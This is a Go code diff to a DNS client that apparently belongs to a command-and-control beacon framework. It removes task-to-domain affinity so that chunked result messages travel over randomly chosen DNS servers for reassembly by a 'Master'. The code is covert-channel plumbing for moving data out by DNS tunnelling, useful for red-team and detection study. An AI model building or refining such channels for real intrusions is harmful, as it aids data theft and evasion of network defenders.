@@ -125,12 +125,10 @@ func (c *DNSClient) selectDomain(taskID string) (string, error) {
 		}
 	}
 
-	// If this is part of a task, remember the domain selection
-	if taskID != "" {
-		c.mutex.Lock()
-		c.taskDomainMap[taskID] = selectedDomain
-		c.mutex.Unlock()
-	}
+	// NOTE: Task domain mapping removed to enable proper load balancing
+	// Each chunk can go to a different DNS server for distributed processing
+	// The chunk format (DATA|beaconID|taskID|chunkIndex|data) contains all
+	// necessary metadata for the Master to reassemble results from any server
 
 	return selectedDomain, nil
 }
@@ -170,7 +168,8 @@ func (c *DNSClient) decodeResponse(encoded string) (string, error) {
 }
 
 // sendDNSQuery sends a command via DNS query with multi-domain support
-// taskID parameter ensures all chunks for a task go to the same domain
+// taskID parameter is used for metadata tracking but does NOT enforce domain affinity
+// to allow proper load balancing across DNS servers
 func (c *DNSClient) sendDNSQuery(command string, taskID string) (string, error) {
 	encodedCmd, err := c.encodeCommand(command)
 	if err != nil {
@@ -182,8 +181,8 @@ func (c *DNSClient) sendDNSQuery(command string, taskID string) (string, error) 
 		return "", fmt.Errorf("command too long: %d characters (max %d)", len(encodedCmd), c.config.MaxCommandLength)
 	}
 
-	// Select domain (with task affinity if taskID provided)
-	domain, err := c.selectDomain(taskID)
+	// Select domain randomly for load balancing (no task affinity)
+	domain, err := c.selectDomain("")
 	if err != nil {
 		return "", fmt.Errorf("failed to select domain: %v", err)
 	}
@@ -280,7 +279,7 @@ func (c *DNSClient) sendCommand(command string) (string, error) {
 	timestamp := fmt.Sprintf("%d", time.Now().Unix())
 	commandWithTimestamp := fmt.Sprintf("%s|%s", command, timestamp)
 
-	// Extract taskID from command for task affinity (RESULT, RESULT_META, DATA)
+	// Extract taskID from command for metadata tracking (not for domain affinity)
 	// Format: RESULT|beaconID|taskID|data
 	// Format: RESULT_META|beaconID|taskID|totalSize|totalChunks
 	// Format: DATA|beaconID|taskID|chunkIndex|data
@@ -294,12 +293,6 @@ func (c *DNSClient) sendCommand(command string) (string, error) {
 	}
 
 	result, err := c.sendDNSQuery(commandWithTimestamp, taskID)
-
-	// Clean up task mapping after final result or when task is done
-	if err == nil && taskID != "" && parts[0] == "RESULT" {
-		// For single-chunk results, clean up immediately
-		c.cleanupTaskMapping(taskID)
-	}
 
 	return result, err
 }
